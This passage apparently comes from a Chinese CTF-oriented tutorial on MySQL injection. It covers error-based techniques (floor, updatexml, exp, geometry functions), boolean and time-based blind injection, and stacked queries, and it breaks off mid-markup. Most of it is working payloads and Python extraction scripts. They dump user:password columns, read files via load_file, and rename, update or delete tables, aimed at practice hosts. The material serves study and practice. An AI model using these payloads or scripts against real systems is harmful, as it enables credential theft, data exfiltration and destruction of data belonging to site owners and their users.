title="报错注入"></a>报错注入</h2><p>大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行，<code>报错的过程可能会出现在查询或者插入甚至删除的过程中。</code></p><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>floor()（8.x&gt;mysql&gt;5.0）<code>双查询报错注入</code><br>函数返回小于或等于指定值（value）的最小整数,取整</p><p>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1<br>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<br>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">/*拆解出来就是下面的语句*/</span><br><span class="line">concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x</span><br></pre></td></tr></table></figure><p>可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错</p><p>双查询报错注入的原理 <a target="_blank" rel="noopener" href="https://blog.csdn.net/lixiangminghate/article/details/80466257%EF%BC%8Chttps://www.freebuf.com/articles/web/250376.html">https://blog.csdn.net/lixiangminghate/article/details/80466257，https://www.freebuf.com/articles/web/250376.html</a></p><p>大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个Floor()就是这种情况。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>对XML文档进行查询的函数</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))</span><br></pre></td></tr></table></figure><h3 id="UPDATEXML-XML-document-XPath-string-new-value"><a href="#UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value);"></a>UPDATEXML (XML_document, XPath_string, new_value);</h3><p>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p><p>这也是一种非常常见的报错注入的函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><h3 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h3><p>返回 e 的 x 次方,当 数据过大 溢出时报错，即 x &gt; 709</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail=&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))) as asd))--+</span><br></pre></td></tr></table></figure><h3 id="geometrycollection-mysql-版本5-5"><a href="#geometrycollection-mysql-版本5-5" class="headerlink" title="geometrycollection() mysql 版本5.5"></a>geometrycollection() mysql 版本5.5</h3><p>（1）函数解释：<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。</p><p>（2）官方文档中举例的用法如下：<br>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p><p>（3）报错原因：<br>因为MYSQL无法使用这样的字符串画出图形，所以报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;manage&#x27; limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure><p>这里和我们上面学过的cancat和上一关学的内置表有两个梦幻联动</p><h3 id="multipoint-mysql-版本5-5"><a href="#multipoint-mysql-版本5-5" class="headerlink" title="multipoint() mysql 版本5.5"></a>multipoint() mysql 版本5.5</h3><p>（1）函数解释：<br>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。<br> <br>（2）报错原因：<br>同样是因为无法使用字符串画出图形与geometrycollection类似</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h3><p>polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.<br>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))--+</span><br></pre></td></tr></table></figure><h3 id="mutipolygon"><a href="#mutipolygon" class="headerlink" title="mutipolygon()"></a>mutipolygon()</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))</span><br></pre></td></tr></table></figure><h3 id="linestring-）"><a href="#linestring-）" class="headerlink" title="linestring(）"></a>linestring(）</h3><p>报错原理：<br>mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span><br></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h3><p>同上</p><h3 id="ST-LatFromGeoHash-（mysql-5-7-x）"><a href="#ST-LatFromGeoHash-（mysql-5-7-x）" class="headerlink" title="ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）"></a>ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))))a)b))--+</span><br></pre></td></tr></table></figure><h3 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST.LongFromGeoHash"></a>ST.LongFromGeoHash</h3><p>同上 嵌套查询</p><h3 id="ST-Pointfromgeohash-mysql-5-7"><a href="#ST-Pointfromgeohash-mysql-5-7" class="headerlink" title="ST_Pointfromgeohash (mysql&gt;5.7)"></a>ST_Pointfromgeohash (mysql&gt;5.7)</h3><p>获取数据库版本信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取sql语句的执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><p>对于基于布尔的盲注，可通过构造真or假判断条件（数据库各项信息取值的大小比较， 如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…）， 将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果 （True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p><h3 id="用到的SQL语法知识"><a href="#用到的SQL语法知识" class="headerlink" title="用到的SQL语法知识"></a>用到的SQL语法知识</h3><p>会用到截取字符的函数：substr()<br>可以直接判断字符或者根据ASCII码来判断，利用ASCII码时要用到ASCII()函数来将字符转换为ASCII码值。<br>还用到了各种运算符，&lt;，&gt;，&#x3D;当然不必多提，但是在下面POST的方式中用到了异或符号^，这里其实是一种异或注入的方法，当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">异或运算规则:</span><br><span class="line">1^1=0 0^0=0 0^1=1</span><br><span class="line">1^1^1=0 1^1^0=0</span><br><span class="line">构造payload:&#x27;^ascii(mid(database(),1,1)=98)^0</span><br></pre></td></tr></table></figure><p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先通过页面对于永真条件or 1&#x3D;1 与永假条件 and 1&#x3D;2 的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p><p>下面给出常用的布尔盲注脚本。</p><ul><li><p>GET型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/&#x27;</span><br><span class="line"></span><br><span class="line">cookies = &#123;       # 如果目标网站要事先登录，就加上cookies吧</span><br><span class="line">    &quot;PHPSESSID&quot;:&quot;c8ab8r49nd2kk0qfhs0dcaktl3&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,90000):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       payload = &quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=0&#x27; or ascii(substr(database(),%d,1))&gt;%d-- &quot; %(i,mid)    # 注意get型的注入注释符要用--空格</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       if &#x27;You are in&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure></li><li><p>POST型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       #payload = &#x27;http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#x27; %(i,mid)</span><br><span class="line">       payload = &quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)#&quot; %(i,mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                     &quot;id&quot;:payload</span><br><span class="line">                &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas)</span><br><span class="line"></span><br><span class="line">       if &#x27;girlfriend&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure></li></ul><p>首先，我们先分析脚本的思路，脚本利用了request库来发送请求，同时定义了一个flag字符串用来储存flag。然后写了一个for循环，封顶跑250遍，然后定义了low和high，这里根据的是ASCII码中的打印字符，定义了中间值，因为一会儿要使用的是二分法，当low&lt;high时进入while循环，执行payload是否大于mid的判断，这里GET和POST略有区别，GET传入的键值对，利用requests.post方法进行请求，GET直接把Payload拼接在url后面进行requests.get方法即可，然后根据我们判断真假的方式写一个if循环，这里的res.text是返回数据，可以先写个简单脚本看一下该怎么从其中判断真假，如果为真low&#x3D;mid+1，然后再取中间值，如果为假则high&#x3D;mid然后取中间值，直到low大于high就能确定出该位置的ASCII码了，然后最下面的if循环是排除掉在两端的特殊情况，然后每次循环打印一次flag，有时候可能还要设置延时，这里没有管。</p><p>利用异或的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;^1--+</span><br><span class="line">?id=0&#x27;^0--+</span><br><span class="line">?id=0&#x27;^(ascii(substr(database(),1,1))&gt;1)--+</span><br><span class="line">?id=0&#x27;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+</span><br></pre></td></tr></table></figure><p>利用order by的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该方法只适用于表里就一行数据的时候。</span><br></pre></td></tr></table></figure><p>如果注入的时候没有报错，我们又不知道列名，就只能用 order by 盲注了。当然，在 过滤了括号 的时候，order by 盲注也是个很好的办法。<br>order by 的主要作用就是让查询出来的数据根据第n列进行排序（默认升序），我们可以使用order by排序比较字符的 ascii 码大小，从第⼀位开始比较，第⼀位相同时比较下⼀位。<br>利用方式参见如下测试：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;5&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 5                                |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;6&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 6                                |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;51&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | 2        | 51                               |</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin where username=&#x27;&#x27; or 1 union select 1,2,&#x27;52&#x27; order by 3;</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">| id | username | password                         |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">|  1 | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|  1 | 2        | 52                               |</span><br><span class="line">+----+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过逐位判断便可得到password</p><p>参考脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"># 定义一个flag取值的一个“范围”</span><br><span class="line">dic = &quot;1234567890qwertyuioplkjhgfdsazxcvbnmQWERTYUIOPLKJHGFDSAZXCVBNM_!@#$%^&amp;*&quot;</span><br><span class="line"># 之所以不定义为空，而是“^”，是为了从头开始匹配</span><br><span class="line">flag = &quot;^&quot;</span><br><span class="line"># 目标url，先传“|1”，获取其数据的排列内容，作为一个对比的基准</span><br><span class="line">url1 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|1&quot;</span><br><span class="line">content1 = requests.get(url1).content</span><br><span class="line"># 这个flag的长度被定义为了50个字符长度</span><br><span class="line">for i in range(50):</span><br><span class="line">    # 从定义的dic中挨个取1字符，拼凑payload</span><br><span class="line">    for letter in dic:</span><br><span class="line">        payload = flag + letter</span><br><span class="line">        #该url最后的“&#125;2b1”--&gt;&quot;&#125;+1&quot;</span><br><span class="line">        url2 = &quot;https://chall.tasteless.eu/level1/index.php?dir=|&#123;select (select flag from level1_flag) regexp &quot;+&quot;&#x27;&quot;+ payload +&quot;&#x27;&quot;+&quot;&#125;%2b1&quot;</span><br><span class="line">        print(url2)</span><br><span class="line">        # 获取实际注入后的排列内容</span><br><span class="line">        content2 = requests.get(url2).content</span><br><span class="line">        # 如果不相等，即为flag内容（为什么是不相等，而不是相等，因为在url2的最后又“+1”，即匹配成功则是“?dir=|2”，匹配不成功则是“?dir=|1”）</span><br><span class="line">        if(content1 != content2):</span><br><span class="line">            flag = payload</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>有的盲注既不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断，其实也是从另一个我们能控制的角度来判断了布尔值。</p><p>对于基于时间的盲注，通过构造真or假判断条件的sql语句， 且sql语句中根据需要联合使用sleep()函数一同向服务器发送请求， 观察服务器响应结果是否会执行所设置时间的延迟响应，以此来判断所构造条件的真or假（若执行sleep延迟，则表示当前设置的判断条件为真）；然后不断调整判断条件中的数值以逼近真实值，最终确定具体的数值大小or名称拼写。</p><p>首先使用以下payload，根据页面的响应是否有延迟来判断是否存在注入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br><span class="line">1 and sleep(5)</span><br></pre></td></tr></table></figure><p>时间盲注用到的SQL语法知识<br>一般的时间盲注主要就是使用sleep()函数进行时间的延迟，然后通过if判断是否执行sleep()：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select database()),1,1))&gt;1,sleep(3),0)#</span><br></pre></td></tr></table></figure><p>trim配合比较。</p><p>trim([both&#x2F;leading&#x2F;trailing] 目标字符串 FROM 源字符串)</p><p>从源字符串中去除首尾&#x2F;首&#x2F;尾的目标字符串，如寻找字符串第一位，假定X代表某字符，trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)不相等，说明正确结果是X或X+1再进行trim(leading X+1 from ‘abcd’) &#x3D; trim(leading X+2 from ‘abcd’) 相等则正确为X，不相等则X+1正确</p><p>若trim(leading X from ‘abcd’) &#x3D; trim(leading X+1 from ‘abcd’)相等说明X与X+1都为字符串的首字符，不存在这种情况，所以需要继续比较X+1与X+2直至相等</p><h3 id="注入流程-1"><a href="#注入流程-1" class="headerlink" title="注入流程"></a>注入流程</h3><p>时间盲注我们也是利用脚本完成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line"></span><br><span class="line">       payload = &quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=1&#x27; and if((ascii(substr(database(),%d,1))&gt;%d),sleep(2),1)-- &quot; %(i,mid)</span><br><span class="line"></span><br><span class="line">       times = time.time()</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       if time.time() - times &gt;= 2:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><p>这是一个GET方式的时间盲注，更改脚本请求方式的方法可以参照上面的布尔盲注，这两个脚本的编写思路是一样的，只是在判断方式上有所区别。</p><p>时间盲注在CTF比赛和平时生产环境中都是比较常见的，但是当我们常⽤的函数被过滤的话，那该怎么办呢？还有以下几种时间盲注方式。</p><p>笛卡尔积延时盲注<br>count(*) 后面所有表中的列笛卡尔积数，数量越多越卡，就会有延迟，类似之前某比赛pgsql的延时注入也可以利用此来 打时间差，从而达到延时注入的效果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| 113101560 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (2.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from ctf_test where user=&#x27;1&#x27; and 1=1 and (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| 1    | 0   |</span><br><span class="line">+------+-----+</span><br><span class="line">1 row in set (2.08 sec)</span><br></pre></td></tr></table></figure><p>得到的结果都会有延迟。这里选用information_schema.columns表的原因是其内部数据较多，到时候可以根据实际情况调换。</p><p>那么我们就可以使用这个原理，并配合if()语句进行延时注入了，payload 与之前相似，类似如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; and if(ascii(substr((select database()),1,1))&gt;1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#</span><br><span class="line"></span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 504 Gateway Time-out    # 有很长的延时, 以至于Time-out了</span><br></pre></td></tr></table></figure><p>给出一个笛卡尔积延时注入脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://4.c56083ac-9da0-437e-9b51-5db047b150aa.jvav.vnctf2021.node4.buuoj.cn:82/user/login&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       payload = &quot;&#x27; or if((select ascii(substr((select password from user where username=&#x27;admin&#x27;),%d,1)))&gt;%d,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)#&quot; % (i, mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                &quot;username&quot;:&quot;admin&quot;,</span><br><span class="line">                &quot;password&quot;: payload</span><br><span class="line">        &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas,timeout=None)    # 不限制超时</span><br><span class="line"></span><br><span class="line">       if &#x27;504 Gateway Time-out&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>在SQL中，分号; 是用来表示一条sql语句的结束。试想一下，我们在结束一个sql语句后继续构造下一条语句，会不会一起执行？ 因此这个想法也就造就了堆叠注入。</p><p>而联合注入也是将两条语句合并在一起，两者之间有什么区别么？</p><p>区别就在于 union 或者union all执行的语句类型是有限制的，可以用来执行的是查询语句，而堆叠注入可以执行的是任意的语句。 例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：select * from products where id&#x3D;1;DELETE FROM products; 当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p><p>但是，这种堆叠注入也是有局限性的。堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。</p><p>虽然我们前面提到了堆叠查询可以执行任意的sql语句，但是这种注入方式并不是十分的完美的。在有的Web系统中，因为代码通常只返回一个查询结果，因此，堆叠注入第二个语句产生的错误或者执行结果只能被忽略，我们在前端界面是无法看到返回结果的。因此，在读取数据时，建议配合使用 union 联合注入。</p><p>一般存在堆叠注入的都是由于使用 mysqli_multi_query() 函数执行的sql语句，该函数可以执行一个或多个针对数据库的查询，多个查询用分号进行分隔。</p><h3 id="注入流程-2"><a href="#注入流程-2" class="headerlink" title="注入流程"></a>注入流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 读取数据</span><br><span class="line">/?id=1&#x27;;show databases;--+</span><br><span class="line">/?id=1&#x27;;show tables;--+</span><br><span class="line">/?id=1&#x27;;show tables from database_name;--+</span><br><span class="line">/?id=1&#x27;;show columns from table_name;--+</span><br><span class="line"></span><br><span class="line"># 读取文件</span><br><span class="line">/?id=1&#x27;;select load_file(&#x27;/flag&#x27;);--+</span><br><span class="line"></span><br><span class="line"># 修改数据表的结构</span><br><span class="line">/?id=1&#x27;;insert into users(id,username,password)values(20,&#x27;whoami&#x27;,&#x27;657260&#x27;);--+    # 插入数据</span><br><span class="line">/?id=1&#x27;;update users set password=&#x27;657260&#x27; where id&gt;0;--+    # 更改数据</span><br><span class="line">/?id=1&#x27;;delete from users where id=20;--+    # 删除数据</span><br><span class="line">/?id=1&#x27;;create table fake_users like users;--+    # 创建一个新表</span><br><span class="line">?id=1&#x27;;rename table old_table to new_table;--+    # 更改表名</span><br><span class="line">?id=1&#x27;;alter table users change old_column new_column varchar(100);--+    # 更改字段名</span><br></pre></td></tr></table></figure><p>下面是MySQL堆叠注入的几种常见姿势。</p><p>rename 修改表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to words1;rename table flag_here to words;#</span><br><span class="line"># rename命令用于修改表名。</span><br><span class="line"># rename命令格式：rename table 原表名 to 新表名;</span><br></pre></td></tr></table></figure><p>rename&#x2F;alter 修改表名与字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;rename table words to words1;rename table flag_here to words;alter table words change flag id varchar(100);#</span><br><span class="line"></span><br><span class="line">rename命令用于修改表名。</span><br><span class="line">rename命令格式：rename table 原表名 to 新表名;</span><br></pre></td></tr></table></figure><p>利用 HANDLER 语句<br>如果rename、alter被过滤了，我们可以借助HANDLER语句来bypass。在不更改表名的情况下读取另一个表中的数据。</p><p>HANDLER … OPEN 语句打开一个表，使其可以使用后续 HANDLER … READ 语句访问，该表对象未被其他会话共享，并且在会话调用 HANDLER … CLOSE 或会话终止之前不会关闭，详情请见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/taoyaostudy/p/13479367.html">https://www.cnblogs.com/taoyaostudy/p/13479367.html</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</span><br><span class="line">或</span><br><span class="line">1&#x27;;HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;#</span><br></pre></td></tr></table></figure><p>堆叠注入中的盲注<br>堆叠注入中的盲注往往是插入sql语句进行实践盲注，就比如 [SWPU2019]Web4 这道题。编写时间盲注脚本：</p><figure class="highlight plaintext"><table><tr><td 